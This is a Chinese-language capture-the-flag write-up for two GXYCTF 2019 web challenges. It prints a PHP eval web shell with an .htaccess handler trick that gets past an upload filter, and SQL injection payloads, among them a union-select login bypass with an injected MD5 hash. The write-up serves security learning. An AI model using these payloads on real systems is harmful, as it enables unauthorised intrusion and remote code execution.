# GXYCTF 2019

## Web

### BabyUpload

通过上传图片在 Request 中修改文件名为 `123.php` 并修改内容为 `<?php eval($_POST['data']); ?>` 发现回显为“后缀名不能有ph！”，尝试修改大小写发现也不行，根据 Response Header 中的 openresty 可以推断出 Web 服务器用的是 Nginx，尝试使用 `.htaccess` 绕过，上传类型如果为 `image/png` 则会提示图片太露骨，需要修改为 `image/jpeg` 。

```htaccess
<FilesMatch "png">
setHandler application/x-httpd-php
</FilesMatch>
```

回显提示 `.htaccess` 上传成功后，尝试上传图片马 `<?php eval($_POST['data']); ?>` 后提示“诶，别蒙我啊，这标志明显还是php啊”，故修改为 `<script language="php">eval($_POST['data']);</script>` 后提示上传成功，通过蚁剑直通根目录找到了 flag

### BabySQli

构造 payload `user=1'&pw=1` 回显报错，发现注释里面包含字符串，先通过 base64 解密发现不行后尝试 base32 解密，解密后发现末尾“==”的特征后进行 base64 解密可以获得 `select * from user where username = '$name'` 。

通过输入可以判断 or、=、() 被过滤了，因此就通过 `oRder by` 来康康它有多少个字段，通过一直到 `1' oRder by 4#` 报错消失，所以推断出字段有 3 个。

构造 payload `name=1' union select 1,'admin','1'#&pw=1` 回显 wrong pass!，说明用户名对了但密码错误了，尝试用 md5 加密 1 后重新构造 payload `name=1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1` 尝试康康能不能成功，结果没想到成功得到了 flag。
